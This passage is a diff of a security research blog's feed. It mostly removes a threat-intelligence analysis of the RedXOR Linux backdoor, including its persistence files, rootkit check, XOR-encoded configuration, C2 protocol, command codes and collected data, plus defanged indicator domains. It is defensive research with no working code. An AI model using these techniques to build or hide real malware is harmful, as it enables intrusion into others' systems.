+&lt;/div&gt;</description></item><item><title>When the AI Edits Its Own Trust Boundary: Remote Code Execution Vulnerability in AWS's Agentic IDE</title><link>https://research.intezer.com/blog/2026/07/remote-code-execution-kiro/</link><pubDate>Mon, 20 Jul 2026 00:00:00 +0000</pubDate><guid>https://research.intezer.com/blog/2026/07/remote-code-execution-kiro/</guid><description>
 &lt;div class="hx:overflow-x-auto hx:mt-6 hx:flex hx:rounded-lg hx:border hx:py-2 hx:ltr:pr-4 hx:rtl:pl-4 hx:contrast-more:border-current hx:contrast-more:dark:border-current hx:border-blue-200 hx:bg-blue-100 hx:text-blue-900 hx:dark:border-blue-200/30 hx:dark:bg-blue-900/30 hx:dark:text-blue-200"&gt;
 &lt;div class="hx:ltr:pl-3 hx:ltr:pr-2 hx:rtl:pr-3 hx:rtl:pl-2"&gt;&lt;svg height=1.2em class="hx:inline-block hx:align-middle" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" aria-hidden="true"&gt;&lt;path stroke-linecap="round" stroke-linejoin="round" d="M13 16h-1v-4h-1m1-4h.01M21 12a9 9 0 11-18 0 9 9 0 0118 0z"/&gt;&lt;/svg&gt;&lt;/div&gt;
 &lt;div class="hx:w-full hx:min-w-0 hx:leading-7"&gt;
@@ -16484,561 +17365,6 @@ data-copied-label="Copied!"
 &lt;div class="hextra-code-block hx:relative hx:mt-6 hx:first:mt-0 hx:group/code"&gt;
 &lt;div&gt;&lt;pre&gt;&lt;code&gt;update.iap5u1rbety6vifaxsi9vovnc9jjay2l[.]com
 cloudflare-dns[.]com&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class="hextra-code-copy-btn-container hx:opacity-0 hx:transition hx:group-hover/code:opacity-100 hx:flex hx:gap-1 hx:absolute hx:m-[11px] hx:right-0 hx:top-0"&gt;
-&lt;button
-class="hextra-code-copy-btn hx:group/copybtn hx:cursor-pointer hx:transition-all hx:active:opacity-50 hx:bg-primary-700/5 hx:border hx:border-black/5 hx:text-gray-600 hx:hover:text-gray-900 hx:rounded-md hx:p-1.5 hx:dark:bg-primary-300/10 hx:dark:border-white/10 hx:dark:text-gray-400 hx:dark:hover:text-gray-50"
-title="Copy code"
-aria-label="Copy code"
-data-copied-label="Copied!"
-&gt;
-&lt;div class="hextra-copy-icon hx:group-[.copied]/copybtn:hidden hx:pointer-events-none hx:h-4 hx:w-4"&gt;&lt;/div&gt;
-&lt;div class="hextra-success-icon hx:hidden hx:group-[.copied]/copybtn:block hx:pointer-events-none hx:h-4 hx:w-4"&gt;&lt;/div&gt;
-&lt;/button&gt;
-&lt;/div&gt;
-&lt;/div&gt;</description></item><item><title>New Linux Backdoor RedXOR Likely Operated by Chinese Nation-State Actor</title><link>https://research.intezer.com/blog/2021/03/new-linux-backdoor-redxor-likely-operated-by-chinese-nation-state-actor/</link><pubDate>Wed, 10 Mar 2021 00:00:00 +0000</pubDate><guid>https://research.intezer.com/blog/2021/03/new-linux-backdoor-redxor-likely-operated-by-chinese-nation-state-actor/</guid><description>
-&lt;ul&gt;
-&lt;li&gt;We discovered a new sophisticated backdoor targeting Linux endpoints and
-servers&lt;/li&gt;
-&lt;li&gt;Based on Tactics, Techniques, and Procedures (TTPs) the backdoor is believed
-to be developed by Chinese nation-state actors&lt;/li&gt;
-&lt;li&gt;The backdoor masquerades itself as polkit daemon. We named it RedXOR for its
-network data encoding scheme based on XOR. The malware was compiled on Red
-Hat Enterprise Linux&lt;/li&gt;
-&lt;li&gt;We provide recommendations for detecting and responding to this threat below&lt;/li&gt;
-&lt;/ul&gt;
-&lt;h2&gt;Intro&lt;span class="hx:absolute hx:-mt-20" id="intro"&gt;&lt;/span&gt;
-&lt;a href="#intro" class="subheading-anchor" aria-label="Permalink for this section"&gt;&lt;/a&gt;&lt;/h2&gt;&lt;p&gt;2020
-&lt;a href="https://intezer.com/blog/cloud-security/2020-set-record-for-new-linux-malware-families/"target="_blank" rel="noopener"&gt;set a record&lt;/a&gt;
-for new Linux malware families. New malware families targeting Linux systems
-are being discovered on a regular basis. Backdoors attributed to advanced
-threat actors are disclosed less frequently.&lt;/p&gt;
-&lt;p&gt;We have discovered an undocumented backdoor targeting Linux systems,
-masqueraded as &lt;a href="https://linux.die.net/man/8/polkitd"target="_blank" rel="noopener"&gt;polkit daemon&lt;/a&gt;. We named
-it RedXOR for its network data encoding scheme based on XOR.&lt;/p&gt;
-&lt;p&gt;Based on victimology, as well as similar components and Tactics, Techniques,
-and Procedures (TTPs), we believe RedXOR was developed by high profile Chinese
-threat actors. The samples, which have low detection rates in VirusTotal, were
-uploaded from Indonesia and Taiwan, countries known to be targeted by Chinese
-threat actors. The samples are compiled with a legacy GCC compiler on an old
-release of Red Hat Enterprise Linux, hinting that RedXOR is used in targeted
-attacks against legacy Linux systems.&lt;/p&gt;
-&lt;p&gt;During our investigation we experienced an &amp;ldquo;on and off&amp;rdquo; availability of the
-Command and Control (C2) server indicating that the operation is still active.&lt;/p&gt;
-&lt;h2&gt;Connections to Chinese Threat Actors&lt;span class="hx:absolute hx:-mt-20" id="connections-to-chinese-threat-actors"&gt;&lt;/span&gt;
-&lt;a href="#connections-to-chinese-threat-actors" class="subheading-anchor" aria-label="Permalink for this section"&gt;&lt;/a&gt;&lt;/h2&gt;&lt;p&gt;We uncovered key similarities between RedXOR and previously reported malware
-associated with Winnti umbrella threat group. These malware are PWNLNX backdoor
-and XOR.DDOS and Groundhog, two botnets attributed to Winnti by
-&lt;a href="https://www.blackberry.com/us/en/pdfviewer?file=/content/dam/blackberry-com/asset/enterprise/pdf/direct/report-bb-decade-of-the-rats.pdf"target="_blank" rel="noopener"&gt;BlackBerry&lt;/a&gt;.&lt;/p&gt;
-&lt;p&gt;The below samples can be used for reference:&lt;/p&gt;
-&lt;ul&gt;
-&lt;li&gt;PWNLNX –
-&lt;a href="https://analyze.intezer.com/files/6a9f16440b9319f427825bb12d7a0cda89b101cf7b8b15ec7dd620b4d68db514"target="_blank" rel="noopener"&gt;4278ab79c34ea92788259fb43e535aa3&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;XOR.DDOS –
-&lt;a href="https://analyze.intezer.com/files/dba757c20fbc1d81566ef2877a9bfca9b3ddb84b9f04c0ca5ae668b7f40ea8c3"target="_blank" rel="noopener"&gt;d6a6dee6afa6879b729a0af3cde7ff33&lt;/a&gt;&lt;/li&gt;
-&lt;/ul&gt;
-&lt;p&gt;Similarities between the samples:&lt;/p&gt;
-&lt;ul&gt;
-&lt;li&gt;
-&lt;p&gt;Use of old open-source kernel rootkits: RedXOR uses an open-source LKM
-rootkit called &amp;ldquo;&lt;a href="https://github.com/yaoyumeng/adore-ng"target="_blank" rel="noopener"&gt;Adore-ng&lt;/a&gt;&amp;rdquo; to hide
-its process. Based on a
-&lt;a href="https://content.fireeye.com/apt-41/rpt-apt41/"target="_blank" rel="noopener"&gt;FireEye report&lt;/a&gt; Winnti used
-this rootkit in their &amp;ldquo;ADORE.XSE&amp;rdquo; Linux backdoor. Embedding open-source LKM
-rootkits is a common Winnti technique. The group has been documented using
-&lt;a href="https://medium.com/chronicle-blog/winnti-more-than-just-windows-and-gates-e4f03436031a"target="_blank" rel="noopener"&gt;Azazel&lt;/a&gt;
-and
-&lt;a href="https://www.blackberry.com/us/en/pdfviewer?file=/content/dam/blackberry-com/asset/enterprise/pdf/direct/report-bb-decade-of-the-rats.pdf#MKTG%2020-0089%20Decade_the_RAT%27s_Report.indd%3A.176091%3A522"target="_blank" rel="noopener"&gt;Suterusu&lt;/a&gt;.&lt;/p&gt;
-&lt;/li&gt;
-&lt;li&gt;
-&lt;p&gt;The &lt;code&gt;CheckLKM&lt;/code&gt; function name used by RedXOR has also been used in PWNLNX and
-XOR.DDOS.&lt;/p&gt;
-&lt;/li&gt;
-&lt;li&gt;
-&lt;p&gt;Provides the operator with a pseudo-terminal: RedXOR uses Python pty shell by
-importing the &lt;a href="https://docs.python.org/3/library/pty.html"target="_blank" rel="noopener"&gt;python pty&lt;/a&gt;
-library. PWNLNX implements the pty shell function in c.
-&lt;figure&gt;
-&lt;img src="https://research.intezer.com/blog/2021/03/new-linux-backdoor-redxor-likely-operated-by-chinese-nation-state-actor/images/fig1.png" title="Figure 1: Python pty shell used in RedXOR" alt="" loading="lazy" /&gt;
-&lt;figcaption&gt;Figure 1: Python pty shell used in RedXOR&lt;/figcaption&gt;
-&lt;/figure&gt;&lt;/p&gt;
-&lt;/li&gt;
-&lt;li&gt;
-&lt;p&gt;Encoding network with XOR: The backdoor encodes its network data with a
-scheme based on XOR. Encoding network data with XOR has been used in previous
-Winnti malware including PWNLNX.&lt;/p&gt;
-&lt;/li&gt;
-&lt;li&gt;
-&lt;p&gt;Persistence service name: As part of its persistence methods, RedXOR attempts
-to create a service under rc.d. The developer added &amp;ldquo;S99&amp;rdquo; before the name of
-the service to lower its priority and make it run last on system initiation.
-This technique was used in XOR.DDOS and Groundhog samples where the malware
-developer added &amp;ldquo;S90&amp;rdquo; to the service name.&lt;/p&gt;
-&lt;/li&gt;
-&lt;li&gt;
-&lt;p&gt;Main functions flow: PWNLX and RedXOR have a main function which is in charge
-of initialization. In both backdoors, the main function calls another
-function which is in charge of the main logic. The main logic function names
-are main_process in RedXOR and MainThread in PWLNX. Both main functions
-daemonize the process to detach from the terminal and run in the background.&lt;/p&gt;
-&lt;/li&gt;
-&lt;li&gt;
-&lt;p&gt;XML for file listing: RedXOR’s directory function and PWNLNX’s getfiles
-function are both in charge of directory listing. Their code flow
-implementation is different, however, as both malware send the directory
-listing as an XML file to the C2 server. Figure 2 shows the XML structure
-used in PWNLNX and RedXOR. The file’s data used in both functions are: path,
-name, type, user, permission, size, time.
-&lt;figure&gt;
-&lt;img src="https://research.intezer.com/blog/2021/03/new-linux-backdoor-redxor-likely-operated-by-chinese-nation-state-actor/images/fig2.png" title="Figure 2: The XML structure used by PWNLNX’s getfiles function and RedXOR’s directory function" alt="" loading="lazy" /&gt;
-&lt;figcaption&gt;Figure 2: The XML structure used by PWNLNX’s getfiles function and RedXOR’s directory function&lt;/figcaption&gt;
-&lt;/figure&gt;&lt;/p&gt;
-&lt;/li&gt;
-&lt;li&gt;
-&lt;p&gt;Legacy Red Hat compilers: RedXOR and PWNLNX were both compiled with a Red Hat
-4.4.7 compiler. This compiler is the default GCC compiler on RHEL6.&lt;/p&gt;
-&lt;/li&gt;
-&lt;li&gt;
-&lt;p&gt;Chown similarity: Both PWNLNX and RedXOR change the file’s user and group
-owner to a large ID. The same technique has been used by the XOR.DDoS malware
-as referenced in the analysis by
-&lt;a href="https://blog.malwaremustdie.org/2014/09/mmd-0028-2014-fuzzy-reversing-new-china.html"target="_blank" rel="noopener"&gt;MalwareMustDie&lt;/a&gt;.
-&lt;figure&gt;
-&lt;img src="https://research.intezer.com/blog/2021/03/new-linux-backdoor-redxor-likely-operated-by-chinese-nation-state-actor/images/fig3.png" title="Figure 3: Similarity between PWNLNX and RedXOR of the UID and GID used with lchown function call" alt="" loading="lazy" /&gt;
-&lt;figcaption&gt;Figure 3: Similarity between PWNLNX and RedXOR of the UID and GID used with lchown function call&lt;/figcaption&gt;
-&lt;/figure&gt;&lt;/p&gt;
-&lt;/li&gt;
-&lt;li&gt;
-&lt;p&gt;Overall flow and functionalities: The overall code flow, behavior, and
-capabilities of RedXOR are very similar to PWNLNX. Both have file uploading
-and downloading functionalities together with a running shell. The network
-tunneling functionality in both families is called &amp;ldquo;PortMap&amp;rdquo;.&lt;/p&gt;
-&lt;/li&gt;
-&lt;li&gt;
-&lt;p&gt;Unstripped ELF binaries: Malware developers will often tamper with a file’s
-symbols and/or sections, making it harder for researchers to analyze them.
-However, RedXOR and various Winnti malware, including PWNLNX and XOR.DDOS,
-are unstripped.&lt;/p&gt;
-&lt;/li&gt;
-&lt;/ul&gt;
-&lt;h2&gt;Technical Analysis&lt;span class="hx:absolute hx:-mt-20" id="technical-analysis"&gt;&lt;/span&gt;
-&lt;a href="#technical-analysis" class="subheading-anchor" aria-label="Permalink for this section"&gt;&lt;/a&gt;&lt;/h2&gt;&lt;p&gt;The samples are both unstripped 64-bit ELF files called po1kitd-update-k.
-Uploaded to VirusTotal from Taiwan and Indonesia, they are low detected at the
-time of this writing.&lt;/p&gt;
-&lt;p&gt;&lt;figure&gt;
-&lt;img src="https://research.intezer.com/blog/2021/03/new-linux-backdoor-redxor-likely-operated-by-chinese-nation-state-actor/images/fig4.png" title="Figure 4: 2bd6e2f8c1a97347b1e499e29a1d9b7c in VirusTotal" alt="" loading="lazy" /&gt;
-&lt;figcaption&gt;Figure 4: 2bd6e2f8c1a97347b1e499e29a1d9b7c in VirusTotal&lt;/figcaption&gt;
-&lt;/figure&gt;&lt;/p&gt;
-&lt;h3&gt;Malware Installation&lt;span class="hx:absolute hx:-mt-20" id="malware-installation"&gt;&lt;/span&gt;
-&lt;a href="#malware-installation" class="subheading-anchor" aria-label="Permalink for this section"&gt;&lt;/a&gt;&lt;/h3&gt;&lt;p&gt;Upon execution RedXOR forks off a child process allowing the parent process to
-exit. The purpose is to detach the process from the shell. The new child
-determines if it has been executed as the root user or as another user on the
-system. It does this to create a hidden folder, called &lt;code&gt;.po1kitd.thumb&lt;/code&gt;, inside
-the user’s home folder which is used to store files related to the malware. The
-malware creates a hidden file called &lt;code&gt;.po1kitd-2a4D53&lt;/code&gt; inside the folder. The
-file is locked to the current running process, seen in Figure 5, essentially
-creating a mutex. If another instance of the malware is executed, it also tries
-to obtain the lock but ultimately fails. Upon this failure the process exits.&lt;/p&gt;
-&lt;p&gt;&lt;figure&gt;
-&lt;img src="https://research.intezer.com/blog/2021/03/new-linux-backdoor-redxor-likely-operated-by-chinese-nation-state-actor/images/fig5.png" title="Figure 5: The malware creates a mutex file locking it to the process ID" alt="" loading="lazy" /&gt;
-&lt;figcaption&gt;Figure 5: The malware creates a mutex file locking it to the process ID&lt;/figcaption&gt;
-&lt;/figure&gt;&lt;/p&gt;
-&lt;p&gt;After the malware creates the mutex, it installs itself on the infected
-machine. As shown in Figure 6, the malware looks up its current path and moves
-the binary to the created folder. It hides the file by naming it
-&lt;code&gt;.po1kitd-update-k&lt;/code&gt;.&lt;/p&gt;
-&lt;p&gt;&lt;figure&gt;
-&lt;img src="https://research.intezer.com/blog/2021/03/new-linux-backdoor-redxor-likely-operated-by-chinese-nation-state-actor/images/fig6.png" title="Figure 6: Malware moves the binary to the hidden folder po1kitd.thumb created earlier. It first tries to use the rename function provided by libc. If this fails, it executes an mv shell command via the system function" alt="" loading="lazy" /&gt;
-&lt;figcaption&gt;Figure 6: Malware moves the binary to the hidden folder po1kitd.thumb created earlier. It first tries to use the rename function provided by libc. If this fails, it executes an mv shell command via the system function&lt;/figcaption&gt;
-&lt;/figure&gt;&lt;/p&gt;
-&lt;p&gt;After installing the binary to the hidden folder, the malware sets up
-persistence via &lt;code&gt;init&lt;/code&gt; scripts. The following files are created after executing
-the malware on boot:&lt;/p&gt;
-&lt;ul&gt;
-&lt;li&gt;&lt;code&gt;/usr/syno/etc/rc.d/S99po1kitd-update.sh&lt;/code&gt;&lt;/li&gt;
-&lt;li&gt;&lt;code&gt;/etc/init.d/po1kitd-update&lt;/code&gt;&lt;/li&gt;
-&lt;li&gt;&lt;code&gt;/etc/rc2.d/S99po1kitd-update&lt;/code&gt;&lt;/li&gt;
-&lt;/ul&gt;
-&lt;p&gt;The malware checks if the rootkit is active by creating a file and removing it.
-Then, the malware compares the &amp;ldquo;saved set-user-ID&amp;rdquo; of the process to the user
-ID. If they don’t match, the rootkit is enabled. If they match, it looks to see
-if the user ID is &amp;ldquo;10&amp;rdquo;. If this is the case, the rootkit is enabled. This logic
-is shown in Figure 7.&lt;/p&gt;
-&lt;p&gt;&lt;figure&gt;
-&lt;img src="https://research.intezer.com/blog/2021/03/new-linux-backdoor-redxor-likely-operated-by-chinese-nation-state-actor/images/fig7.png" title="Figure 7: Logic used by RedXOR to check if the rootkit is enabled" alt="" loading="lazy" /&gt;
-&lt;figcaption&gt;Figure 7: Logic used by RedXOR to check if the rootkit is enabled&lt;/figcaption&gt;
-&lt;/figure&gt;&lt;/p&gt;
-&lt;p&gt;The &lt;code&gt;CheckLKM&lt;/code&gt; logic is almost identical to the &lt;code&gt;adore_init&lt;/code&gt; function in the
-&amp;ldquo;adore-ng&amp;rdquo; rootkit. Afore-ng is a Chinese open-source LKM (Loadable Kernel
-Module) rootkit. This technique allows the malware to stay under the radar by
-hiding its processes. The code for the init function is shown in Figure 8.&lt;/p&gt;
-&lt;p&gt;&lt;figure&gt;
-&lt;img src="https://research.intezer.com/blog/2021/03/new-linux-backdoor-redxor-likely-operated-by-chinese-nation-state-actor/images/fig8.png" title="Figure 8: Client authentication code for the adore-ng rootkit" alt="" loading="lazy" /&gt;
-&lt;figcaption&gt;Figure 8: Client authentication code for the adore-ng rootkit&lt;/figcaption&gt;
-&lt;/figure&gt;&lt;/p&gt;
-&lt;h3&gt;Configuration&lt;span class="hx:absolute hx:-mt-20" id="configuration"&gt;&lt;/span&gt;
-&lt;a href="#configuration" class="subheading-anchor" aria-label="Permalink for this section"&gt;&lt;/a&gt;&lt;/h3&gt;&lt;p&gt;The malware stores the configuration encrypted within the binary. In addition
-to the Command and control (C2) IP address and port it can also be configured
-to use a proxy. The configuration includes a password, as can be seen in Figure
-9. This password is used by the malware to authenticate to the C2 server.&lt;/p&gt;
-&lt;p&gt;&lt;figure&gt;
-&lt;img src="https://research.intezer.com/blog/2021/03/new-linux-backdoor-redxor-likely-operated-by-chinese-nation-state-actor/images/fig9.png" title="Figure 9: Configuration options for the malware" alt="" loading="lazy" /&gt;
-&lt;figcaption&gt;Figure 9: Configuration options for the malware&lt;/figcaption&gt;
-&lt;/figure&gt;&lt;/p&gt;
-&lt;p&gt;The configuration values are decrypted by the &lt;code&gt;doXor&lt;/code&gt; function. A pseudo-code
-representation of the function is shown in Figure 10. The decryption logic is a
-simple XOR against a byte key. The byte key is incremented by a constant for
-each item in the buffer. The only configuration value that is not encrypted is
-the server port. The port value is used to derive the key and the adder. The
-key is derived from bit shifting the port value eight steps to the right. The
-constant uses the port value.&lt;/p&gt;
-&lt;p&gt;&lt;figure&gt;
-&lt;img src="https://research.intezer.com/blog/2021/03/new-linux-backdoor-redxor-likely-operated-by-chinese-nation-state-actor/images/fig10.png" title="Figure 10: Decryption logic of the configuration data. The data is XORed against a key byte that is incremented by a constant for each entry in the buffer" alt="" loading="lazy" /&gt;
-&lt;figcaption&gt;Figure 10: Decryption logic of the configuration data. The data is XORed against a key byte that is incremented by a constant for each entry in the buffer&lt;/figcaption&gt;
-&lt;/figure&gt;&lt;/p&gt;
-&lt;h3&gt;Communication with the C2&lt;span class="hx:absolute hx:-mt-20" id="communication-with-the-c2"&gt;&lt;/span&gt;
-&lt;a href="#communication-with-the-c2" class="subheading-anchor" aria-label="Permalink for this section"&gt;&lt;/a&gt;&lt;/h3&gt;&lt;p&gt;The malware communicates with the C2 server over a TCP socket. The traffic is
-made to look like HTTP traffic. Figure 11 shows a pseudo-code representation of
-the function used by the malware to prepare data that is to be sent to the C2
-server. First, it fills the buffer with null bytes. The request body is XORed
-against a key. The malware uses the buffer length as the key. This value is
-also passed into the function as the &amp;ldquo;total_length&amp;rdquo; argument.&lt;/p&gt;
-&lt;p&gt;&lt;figure&gt;
-&lt;img src="https://research.intezer.com/blog/2021/03/new-linux-backdoor-redxor-likely-operated-by-chinese-nation-state-actor/images/fig11.png" title="Figure 11: Function for preparing data to be sent to the C2 server" alt="" loading="lazy" /&gt;
-&lt;figcaption&gt;Figure 11: Function for preparing data to be sent to the C2 server&lt;/figcaption&gt;
-&lt;/figure&gt;
-The same logic is used to decrypt the response body from the C2 server. From
-the response, the malware extracts &amp;ldquo;JSESSIONID&amp;rdquo;, &amp;ldquo;Content-Length&amp;rdquo;,
-&amp;ldquo;Total-Length&amp;rdquo; and the response body. The data is added to a struct with the
-following layout:&lt;/p&gt;
-&lt;div class="hextra-code-block hx:relative hx:mt-6 hx:first:mt-0 hx:group/code"&gt;
-&lt;div&gt;&lt;pre&gt;&lt;code&gt;0x0 JSESSIONID as int
-0x8 Content-Length as long
-0x10 Total-Length as long
-0x18 Response body&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class="hextra-code-copy-btn-container hx:opacity-0 hx:transition hx:group-hover/code:opacity-100 hx:flex hx:gap-1 hx:absolute hx:m-[11px] hx:right-0 hx:top-0"&gt;
-&lt;button
-class="hextra-code-copy-btn hx:group/copybtn hx:cursor-pointer hx:transition-all hx:active:opacity-50 hx:bg-primary-700/5 hx:border hx:border-black/5 hx:text-gray-600 hx:hover:text-gray-900 hx:rounded-md hx:p-1.5 hx:dark:bg-primary-300/10 hx:dark:border-white/10 hx:dark:text-gray-400 hx:dark:hover:text-gray-50"
-title="Copy code"
-aria-label="Copy code"
-data-copied-label="Copied!"
-&gt;
-&lt;div class="hextra-copy-icon hx:group-[.copied]/copybtn:hidden hx:pointer-events-none hx:h-4 hx:w-4"&gt;&lt;/div&gt;
-&lt;div class="hextra-success-icon hx:hidden hx:group-[.copied]/copybtn:block hx:pointer-events-none hx:h-4 hx:w-4"&gt;&lt;/div&gt;
-&lt;/button&gt;
-&lt;/div&gt;
-&lt;/div&gt;
-&lt;p&gt;The content length is the length of the response body but also used as the key.
-The total length value is used as a constant which is added to the key in each
-iteration. The JSESSIONID value holds the command ID for the job the C2 wants
-the malware to perform.&lt;/p&gt;
-&lt;h3&gt;Commands&lt;span class="hx:absolute hx:-mt-20" id="commands"&gt;&lt;/span&gt;
-&lt;a href="#commands" class="subheading-anchor" aria-label="Permalink for this section"&gt;&lt;/a&gt;&lt;/h3&gt;&lt;p&gt;The C2 server tells the malware to execute different commands via a command
-code that is returned in the &amp;ldquo;JSESSIONID&amp;rdquo; cookie. The codes are encoded as
-decimal integers. A full list of commands supported by the analyzed malware
-sample are shown in the table below. They can be grouped into command types.
-Commands in the 2000 range provide &amp;ldquo;filesystem&amp;rdquo; interaction, 3000 handle
-&amp;ldquo;shell&amp;rdquo; commands, and 4000 handle network tunneling.&lt;/p&gt;
-&lt;p&gt;&lt;strong&gt;Table 1: List of commands supported by the malware&lt;/strong&gt;&lt;/p&gt;
-&lt;table&gt;
-&lt;thead&gt;
-&lt;tr&gt;
-&lt;th&gt;Code&lt;/th&gt;
-&lt;th&gt;Command&lt;/th&gt;
-&lt;/tr&gt;
-&lt;/thead&gt;
-&lt;tbody&gt;
-&lt;tr&gt;
-&lt;td&gt;0000&lt;/td&gt;
-&lt;td&gt;System information&lt;/td&gt;
-&lt;/tr&gt;
-&lt;tr&gt;
-&lt;td&gt;0008&lt;/td&gt;
-&lt;td&gt;Update&lt;/td&gt;
-&lt;/tr&gt;
-&lt;tr&gt;
-&lt;td&gt;0009&lt;/td&gt;
-&lt;td&gt;Uninstall&lt;/td&gt;
-&lt;/tr&gt;
-&lt;tr&gt;
-&lt;td&gt;1000&lt;/td&gt;
-&lt;td&gt;Ping&lt;/td&gt;
-&lt;/tr&gt;
-&lt;tr&gt;
-&lt;td&gt;1010&lt;/td&gt;
-&lt;td&gt;Install LKM&lt;/td&gt;
-&lt;/tr&gt;
-&lt;tr&gt;
-&lt;td&gt;2049&lt;/td&gt;
-&lt;td&gt;List folder&lt;/td&gt;
-&lt;/tr&gt;
-&lt;tr&gt;
-&lt;td&gt;2054&lt;/td&gt;
-&lt;td&gt;Upload file&lt;/td&gt;
-&lt;/tr&gt;
-&lt;tr&gt;
-&lt;td&gt;2055&lt;/td&gt;
-&lt;td&gt;Open file&lt;/td&gt;
-&lt;/tr&gt;
-&lt;tr&gt;
-&lt;td&gt;2056&lt;/td&gt;
-&lt;td&gt;Execute with system&lt;/td&gt;
-&lt;/tr&gt;
-&lt;tr&gt;
-&lt;td&gt;2058&lt;/td&gt;
-&lt;td&gt;Remove file&lt;/td&gt;
-&lt;/tr&gt;
-&lt;tr&gt;
-&lt;td&gt;2060&lt;/td&gt;
-&lt;td&gt;Remove folder&lt;/td&gt;
-&lt;/tr&gt;
-&lt;tr&gt;
-&lt;td&gt;2061&lt;/td&gt;
-&lt;td&gt;Rename&lt;/td&gt;
-&lt;/tr&gt;
-&lt;tr&gt;
-&lt;td&gt;2062&lt;/td&gt;
-&lt;td&gt;Create new folder&lt;/td&gt;
-&lt;/tr&gt;
-&lt;tr&gt;
-&lt;td&gt;2066&lt;/td&gt;
-&lt;td&gt;Write content to file&lt;/td&gt;
-&lt;/tr&gt;
-&lt;tr&gt;
-&lt;td&gt;3000&lt;/td&gt;
-&lt;td&gt;Start shell&lt;/td&gt;
-&lt;/tr&gt;
-&lt;tr&gt;
-&lt;td&gt;3058&lt;/td&gt;
-&lt;td&gt;Exec shell command&lt;/td&gt;
-&lt;/tr&gt;
-&lt;tr&gt;
-&lt;td&gt;3999&lt;/td&gt;
-&lt;td&gt;Close tty&lt;/td&gt;
-&lt;/tr&gt;
-&lt;tr&gt;
-&lt;td&gt;4001&lt;/td&gt;
-&lt;td&gt;Portmap (Proxy)&lt;/td&gt;
-&lt;/tr&gt;
-&lt;tr&gt;
-&lt;td&gt;4002&lt;/td&gt;
-&lt;td&gt;Kill portmap&lt;/td&gt;
-&lt;/tr&gt;
-&lt;/tbody&gt;
-&lt;/table&gt;
-&lt;h3&gt;System Information&lt;span class="hx:absolute hx:-mt-20" id="system-information"&gt;&lt;/span&gt;
-&lt;a href="#system-information" class="subheading-anchor" aria-label="Permalink for this section"&gt;&lt;/a&gt;&lt;/h3&gt;&lt;p&gt;When the malware first contacts the C2 server it sends a password encoded in
-the request body. The C2 server responds with the command code 0 to collect
-system information. The data collected about the system by the malware is
-listed in the table below. The data is serialized into a URL query-like string,
-encrypted and then sent as the request body.&lt;/p&gt;
-&lt;p&gt;&lt;strong&gt;Table 2: Data collected by the malware and sent back to the C2 server&lt;/strong&gt;&lt;/p&gt;
-&lt;table&gt;
-&lt;thead&gt;
-&lt;tr&gt;
-&lt;th&gt;URL key&lt;/th&gt;
-&lt;th&gt;Description&lt;/th&gt;
-&lt;th&gt;Comment&lt;/th&gt;
-&lt;/tr&gt;
-&lt;/thead&gt;
-&lt;tbody&gt;
-&lt;tr&gt;
-&lt;td&gt;hostip&lt;/td&gt;
-&lt;td&gt;IP&lt;/td&gt;
-&lt;td&gt;Hardcoded to 127.0.0.1&lt;/td&gt;
-&lt;/tr&gt;
-&lt;tr&gt;
-&lt;td&gt;softtype&lt;/td&gt;
-&lt;td&gt;&lt;/td&gt;
-&lt;td&gt;Hardcoded to &amp;ldquo;Linux&amp;rdquo;&lt;/td&gt;
-&lt;/tr&gt;
-&lt;tr&gt;
-&lt;td&gt;pscaddr&lt;/td&gt;
-&lt;td&gt;MAC address&lt;/td&gt;
-&lt;td&gt;&lt;/td&gt;
-&lt;/tr&gt;
-&lt;tr&gt;
-&lt;td&gt;hostname&lt;/td&gt;
-&lt;td&gt;Machine name&lt;/td&gt;
-&lt;td&gt;&lt;/td&gt;
-&lt;/tr&gt;
-&lt;tr&gt;
-&lt;td&gt;hosttar&lt;/td&gt;
-&lt;td&gt;Username&lt;/td&gt;
-&lt;td&gt;Possibly &amp;ldquo;host target&amp;rdquo;&lt;/td&gt;
-&lt;/tr&gt;
-&lt;tr&gt;
-&lt;td&gt;hostos&lt;/td&gt;
-&lt;td&gt;Distribution&lt;/td&gt;
-&lt;td&gt;Extracted from /etc/issue or /etc/redhat-release&lt;/td&gt;
-&lt;/tr&gt;
-&lt;tr&gt;
-&lt;td&gt;hostcpu&lt;/td&gt;
-&lt;td&gt;Clock speed&lt;/td&gt;
-&lt;td&gt;/proc/cpuinfo&lt;/td&gt;
-&lt;/tr&gt;
-&lt;tr&gt;
-&lt;td&gt;hostmem&lt;/td&gt;
-&lt;td&gt;Amount of memory&lt;/td&gt;
-&lt;td&gt;/proc/meminfo&lt;/td&gt;
-&lt;/tr&gt;
-&lt;tr&gt;
-&lt;td&gt;hostpack&lt;/td&gt;
-&lt;td&gt;&lt;/td&gt;
-&lt;td&gt;Hardcoded to &amp;ldquo;Linux&amp;rdquo;&lt;/td&gt;
-&lt;/tr&gt;
-&lt;tr&gt;
-&lt;td&gt;lkmtag&lt;/td&gt;
-&lt;td&gt;Is rootkit enabled&lt;/td&gt;
-&lt;td&gt;&lt;/td&gt;
-&lt;/tr&gt;
-&lt;tr&gt;
-&lt;td&gt;kernel&lt;/td&gt;
-&lt;td&gt;Kernel version&lt;/td&gt;
-&lt;td&gt;Extracted from uname&lt;/td&gt;
-&lt;/tr&gt;
-&lt;/tbody&gt;
-&lt;/table&gt;
-&lt;p&gt;Figure 12 shows the communication between RedXOR and the C2. The malware sends
-the password &lt;code&gt;pd=admin&lt;/code&gt; and C2 responds with &lt;code&gt;all right&lt;/code&gt; (&lt;code&gt;JSESSIONID=0000&lt;/code&gt;).
-Next, the malware sends the system information and the C2 replies with the ping
-command (&lt;code&gt;JSESSIONID=1000&lt;/code&gt;).&lt;/p&gt;
-&lt;p&gt;&lt;figure&gt;
-&lt;img src="https://research.intezer.com/blog/2021/03/new-linux-backdoor-redxor-likely-operated-by-chinese-nation-state-actor/images/fig12.png" title="Figure 12: RedXOR communication with C2" alt="" loading="lazy" /&gt;
-&lt;figcaption&gt;Figure 12: RedXOR communication with C2&lt;/figcaption&gt;
-&lt;/figure&gt;&lt;/p&gt;
-&lt;h3&gt;Update Functionality&lt;span class="hx:absolute hx:-mt-20" id="update-functionality"&gt;&lt;/span&gt;
-&lt;a href="#update-functionality" class="subheading-anchor" aria-label="Permalink for this section"&gt;&lt;/a&gt;&lt;/h3&gt;&lt;p&gt;The malware can be updated by the threat actor. This is performed by sending
